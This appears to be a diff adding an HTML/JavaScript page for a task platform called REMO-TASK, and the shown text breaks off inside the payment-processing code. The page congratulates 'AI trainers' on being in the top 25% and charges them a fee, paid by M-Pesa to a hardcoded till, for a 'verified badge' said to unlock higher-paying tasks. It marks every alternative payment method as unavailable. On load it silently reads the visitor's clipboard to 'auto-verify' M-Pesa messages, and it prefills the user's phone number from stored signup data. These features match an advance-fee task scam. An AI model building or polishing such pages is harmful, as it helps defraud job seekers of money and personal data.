@@ -1,0 +1,1234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Verified Badge - REMO-TASK</title>
+    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg:        #0b1120;
+            --bg-card:   #1a2540;
+            --bg-input:  #243050;
+            --border:    #2e3f60;
+            --border-lt: #3d5080;
+            --text:      #e8edf5;
+            --muted:     #8a9bbf;
+            --dim:       #4a5a7a;
+            --green:     #22c55e;
+            --green-dk:  #16a34a;
+            --green-bg:  rgba(34,197,94,.12);
+            --blue:      #3b82f6;
+            --blue-dk:   #2563eb;
+            --red:       #ef4444;
+            --purple:    #a855f7;
+            --gold:      #fbbf24;
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.5;
+        }
+
+        /* ── Scrollable page ── */
+        .page { max-width: 520px; margin: 0 auto; padding: 20px 16px 60px; }
+
+        /* ── Congratulations Banner ── */
+        .congrats-banner {
+            background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
+            border-radius: 14px;
+            padding: 18px 20px;
+            text-align: center;
+            margin-bottom: 22px;
+            position: relative;
+            overflow: hidden;
+        }
+        .congrats-banner::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(
+                45deg,
+                rgba(255,255,255,.03) 0px,
+                rgba(255,255,255,.03) 1px,
+                transparent 1px,
+                transparent 10px
+            );
+        }
+        .congrats-banner .icon { font-size: 34px; margin-bottom: 6px; }
+        .congrats-banner h2 {
+            font-family: 'Syne', sans-serif;
+            font-size: 17px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .congrats-banner p {
+            font-size: 12px;
+            color: #bfdbfe;
+            line-height: 1.4;
+        }
+
+        /* ── Header ── */
+        .page-header {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .badge-top-right {
+            position: absolute;
+            top: 0; right: 0;
+            width: 56px; height: 56px;
+            background: linear-gradient(135deg, var(--purple), #7c3aed);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 26px;
+            box-shadow: 0 4px 16px rgba(168,85,247,.35);
+            border: 2px solid #9333ea;
+        }
+        .badge-top-right.verified {
+            background: linear-gradient(135deg, var(--green), var(--green-dk));
+            box-shadow: 0 4px 16px rgba(34,197,94,.35);
+            border-color: var(--green-dk);
+        }
+        .page-header .header-icon { font-size: 50px; margin-bottom: 10px; }
+        .page-header h1 {
+            font-family: 'Syne', sans-serif;
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+        .page-header p { font-size: 13px; color: var(--muted); }
+
+        /* ── Fee Card ── */
+        .fee-card {
+            background: linear-gradient(135deg, var(--green) 0%, var(--green-dk) 100%);
+            border-radius: 14px;
+            padding: 22px;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        .fee-card .amount {
+            font-family: 'Syne', sans-serif;
+            font-size: 38px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .fee-card .label { font-size: 13px; color: rgba(255,255,255,.85); margin-bottom: 4px; }
+        .fee-card .sublabel { font-size: 11px; color: rgba(255,255,255,.65); }
+
+        /* ── Benefits Card ── */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 18px;
+            margin-bottom: 18px;
+        }
+        .card-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+        .benefit-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .benefit-row:last-child { margin-bottom: 0; }
+        .benefit-icon { font-size: 18px; flex-shrink: 0; }
+        .benefit-text { font-size: 12px; color: var(--muted); }
+
+        /* ── Encourage Card ── */
+        .encourage-card {
+            background: linear-gradient(135deg, rgba(124,58,237,.8), rgba(109,40,217,.8));
+            border-radius: 14px;
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 22px;
+        }
+        .encourage-card .icon { font-size: 26px; margin-bottom: 6px; }
+        .encourage-card p { font-size: 12px; color: rgba(255,255,255,.9); line-height: 1.6; }
+
+        /* ── Buttons ── */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all .2s;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .btn-green {
+            background: linear-gradient(135deg, var(--green), var(--green-dk));
+            color: #fff;
+            box-shadow: 0 4px 16px rgba(34,197,94,.3);
+        }
+        .btn-green:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(34,197,94,.4); }
+        .btn-green:active { transform: translateY(0); }
+
+        .btn-blue {
+            background: linear-gradient(135deg, var(--blue), var(--blue-dk));
+            color: #fff;
+            box-shadow: 0 4px 14px rgba(59,130,246,.3);
+        }
+        .btn-blue:hover { transform: translateY(-2px); }
+
+        .btn-ghost {
+            background: var(--bg-card);
+            color: var(--muted);
+            border: 1px solid var(--border);
+        }
+        .btn-ghost:hover { border-color: var(--border-lt); color: var(--text); }
+
+        .btn-red {
+            background: linear-gradient(135deg, var(--red), #dc2626);
+            color: #fff;
+        }
+
+        /* ── Overlay ── */
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,.85);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .overlay.active { display: flex; }
+
+        /* ── Popup base ── */
+        .popup {
+            background: var(--bg-card);
+            border-radius: 18px;
+            width: 100%;
+            max-width: 380px;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .popup-header {
+            padding: 22px 22px 0;
+            text-align: center;
+        }
+        .popup-header h3 {
+            font-family: 'Syne', sans-serif;
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+        .popup-header p { font-size: 12px; color: var(--muted); margin-bottom: 14px; }
+        .popup-body { padding: 16px 22px 22px; }
+        .popup-divider {
+            height: 1px;
+            background: var(--border);
+            margin: 0 22px 16px;
+        }
+
+        /* ── Payment Method Popup ── */
+        #paymentPopup { border: 2px solid var(--green-dk); }
+
+        .plan-info-badge {
+            background: var(--green-bg);
+            border: 1px solid rgba(34,197,94,.3);
+            border-radius: 8px;
+            padding: 8px 12px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--green);
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .recommended-tag {
+            background: rgba(251,191,36,.15);
+            border: 1px solid rgba(251,191,36,.3);
+            color: var(--gold);
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: .8px;
+            text-align: center;
+            padding: 5px 10px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        .mpesa-primary-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #16a34a, #15803d);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-family: 'Syne', sans-serif;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+            box-shadow: 0 4px 18px rgba(22,163,74,.4);
+            transition: all .2s;
+            margin-bottom: 8px;
+        }
+        .mpesa-primary-btn small { font-size: 11px; font-weight: 400; opacity: .8; }
+        .mpesa-primary-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(22,163,74,.5); }
+
+        .mpesa-benefits {
+            text-align: center;
+            font-size: 11px;
+            color: var(--green);
+            margin-bottom: 16px;
+        }
+
+        .divider-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 16px 0;
+        }
+        .divider-row span { flex-shrink: 0; font-size: 12px; color: var(--dim); font-weight: 700; }
+        .divider-line { flex: 1; height: 1px; background: var(--border); }
+
+        .form-select {
+            width: 100%;
+            padding: 13px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-lt);
+            border-radius: 10px;
+            color: var(--text);
+            font-family: 'DM Sans', sans-serif;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238a9bbf' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+        }
+        .form-select:focus { outline: none; border-color: var(--green); }
+        .form-select option { background: var(--bg-card); }
+
+        /* ── Payment Details Popup ── */
+        #paymentDetailsPopup { border: 2px solid var(--blue); }
+
+        .form-label {
+            display: block;
+            font-size: 12px;
+            color: var(--muted);
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 13px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-lt);
+            border-radius: 10px;
+            color: var(--text);
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            margin-bottom: 14px;
+        }
+        .form-input::placeholder { color: var(--dim); }
+        .form-input:focus { outline: none; border-color: var(--green); }
+
+        .amount-display {
+            background: var(--bg-input);
+            border: 1px solid var(--border-lt);
+            border-radius: 10px;
+            padding: 13px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+        }
+        .amount-display .lbl { font-size: 12px; color: var(--muted); }
+        .amount-display .val {
+            font-family: 'Syne', sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--green);
+        }
+
+        .security-note {
+            text-align: center;
+            font-size: 11px;
+            color: var(--blue);
+            margin-bottom: 16px;
+        }
+
+        .instant-badge {
+            background: linear-gradient(135deg, rgba(22,163,74,.9), rgba(21,128,61,.9));
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .instant-badge .title {
+            font-family: 'Syne', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+        .instant-badge .sub { font-size: 12px; color: rgba(255,255,255,.8); }
+
+        .steps-block { margin-bottom: 16px; }
+        .steps-block .steps-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+        .steps-block ol { padding-left: 18px; }
+        .steps-block li { font-size: 12px; color: var(--muted); margin-bottom: 5px; }
+
+        /* ── Manual Verify Popup ── */
+        #manualVerifyPopup { border: 2px solid var(--green-dk); }
+
+        .textarea-input {
+            width: 100%;
+            min-height: 110px;
+            padding: 13px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-lt);
+            border-radius: 10px;
+            color: var(--text);
+            font-family: 'DM Sans', sans-serif;
+            font-size: 13px;
+            resize: vertical;
+            margin-bottom: 14px;
+        }
+        .textarea-input::placeholder { color: var(--dim); }
+        .textarea-input:focus { outline: none; border-color: var(--green); }
+
+        .expected-amount {
+            background: var(--green-bg);
+            border: 1px solid rgba(34,197,94,.25);
+            border-radius: 8px;
+            padding: 10px 14px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--green);
+            margin-bottom: 16px;
+        }
+
+        .instructions-block {
+            background: rgba(255,255,255,.04);
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 16px;
+        }
+        .instructions-block p { font-size: 13px; color: var(--muted); line-height: 1.7; }
+
+        /* ── Error Popup ── */
+        #paymentErrorPopup { border: 2px solid var(--red); }
+
+        .error-icon-circle {
+            width: 72px; height: 72px;
+            background: rgba(239,68,68,.15);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 36px;
+            margin: 22px auto 12px;
+        }
+        .error-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 20px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .error-msg {
+            font-size: 13px;
+            color: var(--muted);
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+        .error-info {
+            background: rgba(239,68,68,.08);
+            border: 1px solid rgba(239,68,68,.2);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 12px;
+            color: #fca5a5;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        /* ── Success Popup ── */
+        #successPopup { border: 2px solid var(--green-dk); }
+
+        .success-check {
+            width: 80px; height: 80px;
+            background: linear-gradient(135deg, var(--green), var(--green-dk));
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 40px;
+            font-weight: 700;
+            color: #fff;
+            margin: 22px auto 14px;
+            box-shadow: 0 8px 24px rgba(34,197,94,.4);
+        }
+        .success-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 22px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .success-msg {
+            font-size: 13px;
+            color: var(--muted);
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 14px;
+            padding: 0 10px;
+        }
+        .verified-badge-card {
+            background: linear-gradient(135deg, rgba(59,130,246,.3), rgba(37,99,235,.3));
+            border: 1px solid rgba(59,130,246,.4);
+            border-radius: 12px;
+            padding: 14px;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+        .verified-badge-card .title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .verified-badge-card .sub { font-size: 11px; color: #bfdbfe; }
+        .unlocked-label {
+            text-align: center;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--green);
+            margin-bottom: 14px;
+        }
+
+        /* ── Loading Overlay ── */
+        #loadingOverlay {
+            background: rgba(11,17,32,.95);
+            flex-direction: column;
+            gap: 0;
+        }
+        .loading-box {
+            background: var(--bg-card);
+            border-radius: 18px;
+            padding: 36px 30px 28px;
+            text-align: center;
+            width: 280px;
+            border: 1px solid var(--border);
+        }
+        .loading-icon { font-size: 48px; margin-bottom: 16px; }
+        .loading-text {
+            font-family: 'Syne', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 20px;
+            min-height: 42px;
+            line-height: 1.5;
+        }
+        .progress-bar-track {
+            background: var(--bg-input);
+            border-radius: 99px;
+            height: 5px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--green), #4ade80);
+            border-radius: 99px;
+            animation: progressLoop 2s ease-in-out infinite;
+        }
+        @keyframes progressLoop {
+            0%   { width: 0%; margin-left: 0%; }
+            50%  { width: 70%; margin-left: 15%; }
+            100% { width: 0%; margin-left: 100%; }
+        }
+
+        /* ── Toast ── */
+        .toast {
+            position: fixed;
+            bottom: -80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: #fff;
+            padding: 13px 22px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 8px 24px rgba(0,0,0,.4);
+            z-index: 9999;
+            transition: bottom .3s ease;
+            white-space: nowrap;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show { bottom: 28px; }
+        .toast.success { background: var(--green-dk); }
+
+        /* ── Unavailable form ── */
+        .unavailable-warning {
+            background: rgba(239,68,68,.1);
+            border: 1px solid rgba(239,68,68,.25);
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+            font-size: 12px;
+            color: #fca5a5;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 420px) {
+            .page-header h1 { font-size: 21px; }
+            .fee-card .amount { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ========== MAIN PAGE ========== -->
+<div class="page">
+
+    <!-- Congratulations Banner -->
+    <div class="congrats-banner">
+        <div class="icon">🎉</div>
+        <h2 id="congratsName">Congratulations!</h2>
+        <p>You're among the top 25% AI trainers providing exceptional responses!</p>
+    </div>
+
+    <!-- Header with badge -->
+    <div class="page-header">
+        <div class="badge-top-right" id="badgeTopRight">🎓</div>
+        <div class="header-icon">🎓</div>
+        <h1>Get Your Verified Badge</h1>
+        <p>Your exceptional work qualifies you for elite status</p>
+    </div>
+
+    <!-- Fee Card -->
+    <div class="fee-card">
+        <div class="amount" id="feeAmount">$0.00</div>
+        <div class="label">Verified AI Trainer Badge</div>
+        <div class="sublabel">💳 Instant • Lifetime Access</div>
+    </div>
+
+    <!-- Elite Benefits -->
+    <div class="card">
+        <div class="card-title">🏆 Elite Trainer Benefits</div>
+        <div class="benefit-row">
+            <span class="benefit-icon">⚡</span>
+            <span class="benefit-text">Priority access to unlimited high-value tasks</span>
+        </div>
+        <div class="benefit-row">
+            <span class="benefit-icon">💰</span>
+            <span class="benefit-text">Access to premium, higher-paying complex tasks</span>
+        </div>
+        <div class="benefit-row">
+            <span class="benefit-icon">⭐</span>
+            <span class="benefit-text">Verified badge showcasing your elite status</span>
+        </div>
+        <div class="benefit-row">
+            <span class="benefit-icon">🎯</span>
+            <span class="benefit-text">First priority in task assignments</span>
+        </div>
+    </div>
+
+    <!-- Encourage Card -->
+    <div class="encourage-card">
+        <div class="icon">💪</div>
+        <p>Keep delivering excellent responses and maximize<br>your earning potential as a verified trainer!</p>
+    </div>
+
+    <!-- CTA Button -->
+    <button class="btn btn-green" id="claimBadgeBtn" onclick="openPaymentPopup()">
+        🎓 Claim Your Verified Badge – <span id="btnFeeLabel">$0.00</span>
+    </button>
+
+    <button class="btn btn-ghost" onclick="history.back()">← Back</button>
+</div>
+
+
+<!-- ========== PAYMENT METHOD POPUP ========== -->
+<div class="overlay" id="paymentOverlay">
+    <div class="popup" id="paymentPopup">
+        <div class="popup-header">
+            <h3>💳 Select Payment Method</h3>
+            <p id="popupPlanInfo">Loading...</p>
+        </div>
+        <div class="popup-divider"></div>
+        <div class="popup-body">
+
+            <!-- Recommended tag -->
+            <div style="text-align:center;margin-bottom:10px;">
+                <span class="recommended-tag">⭐ RECOMMENDED</span>
+            </div>
+
+            <!-- M-Pesa Primary -->
+            <button class="mpesa-primary-btn" onclick="openMpesaForm()">
+                <span>📱  M-Pesa Express</span>
+                <small>Fast & Secure Payment</small>
+            </button>
+
+            <div class="mpesa-benefits">✓ Instant activation &nbsp;✓ No card needed &nbsp;✓ 100% secure</div>
+
+            <!-- OR Divider -->
+            <div class="divider-row">
+                <div class="divider-line"></div>
+                <span>OR</span>
+                <div class="divider-line"></div>
+            </div>
+
+            <!-- Secondary M-Pesa -->
+            <button class="btn btn-green" style="margin-bottom:14px;" onclick="openMpesaForm()">Pay With M-Pesa</button>
+
+            <!-- Other payment methods label -->
+            <div style="font-size:12px;color:var(--muted);margin-bottom:8px;">Other payment methods:</div>
+
+            <select class="form-select" id="altMethodSelect" onchange="handleAltMethod(this)">
+                <option value="">Select alternative method...</option>
+                <option value="Credit/Debit Card">💳  Credit/Debit Card</option>
+                <option value="PayPal">🅿️  PayPal</option>
+                <option value="Stripe">◆  Stripe</option>
+                <option value="Google Pay">🔵  Google Pay</option>
+                <option value="Paystack">💠  Paystack</option>
+            </select>
+
+            <button class="btn btn-ghost" onclick="closePaymentPopup()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== PAYMENT DETAILS POPUP ========== -->
+<div class="overlay" id="paymentDetailsOverlay">
+    <div class="popup" id="paymentDetailsPopup">
+        <div class="popup-header">
+            <h3 id="detailsHeader">📱 M-Pesa Express</h3>
+            <p id="detailsPlanInfo">Loading...</p>
+        </div>
+        <div class="popup-divider"></div>
+        <div class="popup-body" id="detailsBody">
+            <!-- Populated by JS -->
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== MANUAL VERIFICATION POPUP ========== -->
+<div class="overlay" id="manualVerifyOverlay">
+    <div class="popup" id="manualVerifyPopup">
+        <div class="popup-header">
+            <div style="font-size:44px;margin-bottom:10px;">📱</div>
+            <h3>Manual Verification</h3>
+            <p>Paste your M-Pesa confirmation message to verify your payment</p>
+        </div>
+        <div class="popup-divider"></div>
+        <div class="popup-body">
+
+            <div class="instructions-block">
+                <p>
+                    If you already paid via M-Pesa:<br><br>
+                    1. Check your M-Pesa messages<br>
+                    2. Copy the <strong>ENTIRE</strong> confirmation message<br>
+                    3. Paste it below and click Verify
+                </p>
+            </div>
+
+            <div class="expected-amount" id="expectedAmountDisplay">Expected Amount: KES —</div>
+
+            <label class="form-label">Paste M-Pesa message here:</label>
+            <textarea
+                class="textarea-input"
+                id="mpesaMessageInput"
+                placeholder="Example: RZS1234567 Confirmed. Ksh194.00 sent to FLEX BS SOLUTIONS 4098264..."
+            ></textarea>
+
+            <button class="btn btn-green" onclick="verifyMpesaMessage()">✓ Verify Payment</button>
+            <button class="btn btn-ghost" onclick="closeManualVerify()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== PAYMENT ERROR POPUP ========== -->
+<div class="overlay" id="paymentErrorOverlay">
+    <div class="popup" id="paymentErrorPopup">
+        <div class="error-icon-circle">⚠️</div>
+        <div class="error-title">Verification Failed</div>
+        <div class="error-msg" id="errorMsgText">An error occurred during verification.</div>
+        <div class="popup-body">
+            <div class="error-info">
+                If money was deducted from your M-Pesa,<br>you can verify manually below.
+            </div>
+            <button class="btn btn-blue" onclick="openManualFromError()">📱 Manual Verify</button>
+            <button class="btn btn-green" onclick="retryPayment()">🔄 Retry Verification</button>
+            <button class="btn btn-ghost" onclick="closePaymentError()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== SUCCESS POPUP ========== -->
+<div class="overlay" id="successOverlay">
+    <div class="popup" id="successPopup">
+        <div class="success-check">✓</div>
+        <div class="success-title">Badge Verified!</div>
+        <div class="success-msg">Congratulations! You are now a verified AI trainer. Access premium tasks and start earning more.</div>
+        <div class="popup-body">
+            <div class="verified-badge-card">
+                <div class="title">🎓 Verified AI Trainer</div>
+                <div class="sub">Your profile now shows verified status</div>
+            </div>
+            <div class="unlocked-label">✓ Premium Features Unlocked</div>
+            <button class="btn btn-green" onclick="handleSuccessProceed()">Continue Training!</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== LOADING OVERLAY ========== -->
+<div class="overlay" id="loadingOverlay">
+    <div class="loading-box">
+        <div class="loading-icon">📱</div>
+        <div class="loading-text" id="loadingText">Loading...</div>
+        <div class="progress-bar-track">
+            <div class="progress-bar-fill"></div>
+        </div>
+    </div>
+</div>
+
+
+<!-- ========== TOAST ========== -->
+<div class="toast" id="toast"></div>
+
+
+<script src="app-config.js"></script>
+<script src="protection.js"></script>
+<script>
+// ================== STATE ==================
+const state = {
+    activateAmount: 0.93,
+    kshAmount: 0,
+    USD_TO_KSH: 129.4,
+    tillNumber: '4098264',
+    tillName: 'FLEX BS SOLUTIONS',
+    selectedMethod: 'M-Pesa Express',
+    currentAmount: 0,
+    currentPhone: ''
+};
+
+// ================== INIT ==================
+document.addEventListener('DOMContentLoaded', () => {
+    loadTillInformation();
+    loadUserName();
+    checkBadgeStatus();
+    checkClipboardForAutoVerification();
+});
+
+function loadTillInformation() {
+    try {
+        const raw = localStorage.getItem('tillfetch');
+        if (raw) {
+            const data = JSON.parse(raw);
+            if (data && data.length > 12) {
+                state.activateAmount = parseFloat(data[12]) || 0;
+            }
+            if (data && data.length > 1) {
+                state.tillNumber = data[0] || state.tillNumber;
+                state.tillName   = data[1] || state.tillName;
+            }
+        }
+    } catch(e) { console.error(e); }
+
+    state.kshAmount = Math.round(state.activateAmount * state.USD_TO_KSH);
+    state.currentAmount = state.kshAmount;
+
+    document.getElementById('feeAmount').textContent   = `$${state.activateAmount.toFixed(2)}`;
+    document.getElementById('btnFeeLabel').textContent = `$${state.activateAmount.toFixed(2)}`;
+}
+
+function loadUserName() {
+    try {
+        const raw = localStorage.getItem('signuplist');
+        if (raw) {
+            const list = JSON.parse(raw);
+            const fullName = list[0] || '';
+            const firstName = fullName.split(' ')[0] || 'User';
+            document.getElementById('congratsName').textContent = `Congratulations, ${firstName}!`;
+        }
+    } catch(e) {}
+}
+
+function checkBadgeStatus() {
+    const verified = localStorage.getItem('verifiedbadge');
+    const el = document.getElementById('badgeTopRight');
+    if (verified) {
+        el.textContent = '✓';
+        el.classList.add('verified');
+    }
+}
+
+// ================== AUTO CLIPBOARD VERIFICATION ==================
+async function checkClipboardForAutoVerification() {
+    try {
+        if (!navigator.clipboard || !navigator.clipboard.readText) return;
+        const text = await navigator.clipboard.readText();
+        if (!text) return;
+
+        if (text.toLowerCase().includes(state.tillName.toLowerCase())) {
+            if (verifyMpesaText(text)) {
+                showToast('Payment verified automatically!', true);
+                setTimeout(showSuccessPopup, 1200);
+            }
+        }
+    } catch(e) {
+        // Clipboard read may be denied – that's fine
+    }
+}
+
+// ================== PAYMENT POPUP ==================
+function openPaymentPopup() {
+    showLoading('Loading payment options...');
+    setTimeout(() => {
+        hideLoading();
+        document.getElementById('popupPlanInfo').textContent =
+            `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)}`;
+        const sel = document.getElementById('altMethodSelect');
+        if (sel) sel.value = '';
+        document.getElementById('paymentOverlay').classList.add('active');
+    }, 800);
+}
+
+function closePaymentPopup() {
+    document.getElementById('paymentOverlay').classList.remove('active');
+}
+
+function handleAltMethod(sel) {
+    const val = sel.value;
+    if (!val) return;
+    showLoading('Loading payment form...');
+    setTimeout(() => {
+        hideLoading();
+        openPaymentDetails(val);
+    }, 600);
+}
+
+// ================== PAYMENT DETAILS POPUP ==================
+function openMpesaForm() {
+    closePaymentPopup();
+    showLoading('Loading M-Pesa Express...');
+    setTimeout(() => {
+        hideLoading();
+        openPaymentDetails('M-Pesa Express');
+    }, 600);
+}
+
+function openPaymentDetails(method) {
+    state.selectedMethod = method;
+    closePaymentPopup();
+
+    const ksh = state.kshAmount;
+    const header = document.getElementById('detailsHeader');
+    const planInfo = document.getElementById('detailsPlanInfo');
+    const body = document.getElementById('detailsBody');
+
+    const icons = {
+        'M-Pesa Express': '📱',
+        'Credit/Debit Card': '💳',
+        'PayPal': '🅿️',
+        'Stripe': '◆',
+        'Google Pay': '🔵',
+        'Paystack': '💠'
+    };
+    header.textContent = `${icons[method] || '💳'} ${method}`;
+    planInfo.textContent = method === 'M-Pesa Express'
+        ? `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)} (Ksh ${ksh})`
+        : `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)}`;
+
+    if (method === 'M-Pesa Express') {
+        body.innerHTML = buildMpesaFormHTML(ksh);
+        prefillPhone();
+    } else {
+        body.innerHTML = buildUnavailableFormHTML();
+    }
+
+    document.getElementById('paymentDetailsOverlay').classList.add('active');
+}
+
+function buildMpesaFormHTML(ksh) {
+    return `
+        <div class="instant-badge">
+            <div class="title">⚡ Instant Verification</div>
+            <div class="sub">Get STK push on your phone!</div>
+        </div>
+
+        <div class="steps-block">
+            <div class="steps-title">How it works:</div>
+            <ol>
+                <li>Enter your M-Pesa phone number</li>
+                <li>Click 'Get Verified Badge'</li>
+                <li>Enter your M-Pesa PIN when prompted</li>
+                <li>Get your verified AI trainer badge instantly!</li>
+            </ol>
+        </div>
+
+        <label class="form-label">M-Pesa Phone Number</label>
+        <input type="tel" class="form-input" id="mpesaPhone" placeholder="e.g., 0712345678">
+
+        <div class="amount-display">
+            <span class="lbl">Amount to Pay:</span>
+            <span class="val">KES ${ksh}</span>
+        </div>
+
+        <div class="security-note">🔒 Secure payment powered by PayHero</div>
+
+        <button class="btn btn-green" onclick="processMpesaPayment()">
+            💳 Get Verified Badge – Ksh ${ksh}
+        </button>
+
+        <div class="divider-row">
+            <div class="divider-line"></div>
+            <span>OR</span>
+            <div class="divider-line"></div>
+        </div>
+
+        <button class="btn btn-blue" onclick="openManualFromForm()">
+            📱 Already Paid? Verify Manually
+        </button>
+
+        <button class="btn btn-ghost" onclick="closePaymentDetails()">Cancel</button>
+    `;
+}
+
+function buildUnavailableFormHTML() {
+    return `
+        <div class="unavailable-warning">
+            ⚠️ This payment method is currently unavailable.<br>Please use M-Pesa Express.
+        </div>
+        <button class="btn btn-ghost" onclick="closePaymentDetails()">Cancel</button>
+    `;
+}
+
+function prefillPhone() {
+    try {
+        const raw = localStorage.getItem('signuplist');
+        if (raw) {
+            const list = JSON.parse(raw);
+            const phone = list[1] || '';
+            const el = document.getElementById('mpesaPhone');
+            if (el && phone) el.value = phone;
+        }
+    } catch(e) {}
+}
+
+function closePaymentDetails() {
+    document.getElementById('paymentDetailsOverlay').classList.remove('active');
+    openPaymentPopup();
+}
+
+// ================== M-PESA PAYMENT PROCESSING ==================
+async function processMpesaPayment() {
+    const phoneEl = document.getElementById('mpesaPhone');
+    if (!phoneEl) return;
+    const phone = phoneEl.value.trim();
+
+    if (!phone) { showToast('Please enter your M-Pesa phone number'); return; }
+
+    let clean = phone.replace(/[\s\-\+]/g, '');
+    if (clean.startsWith('0')) clean = '254' + clean.substring(1);
+    else if (!clean.startsWith('254')) clean = '254' + clean;
+
+    if (clean.length !== 12) {
+        showToast('Invalid phone number. Please use format: 07XXXXXXXX');
+        return;
+    }
+
+    state.currentPhone = clean;
+    document.getElementById('paymentDetailsOverlay').classList.remove('active');
+
+    showLoading('Connecting to PayHero...');
+
+    const ksh = state.kshAmount;
+    const payload = {
+        phone_number: clean,
+        amount: ksh,
+        reference: `REMO-BADGE-${Date.now()}`,
+        platform: 'HK93V1',
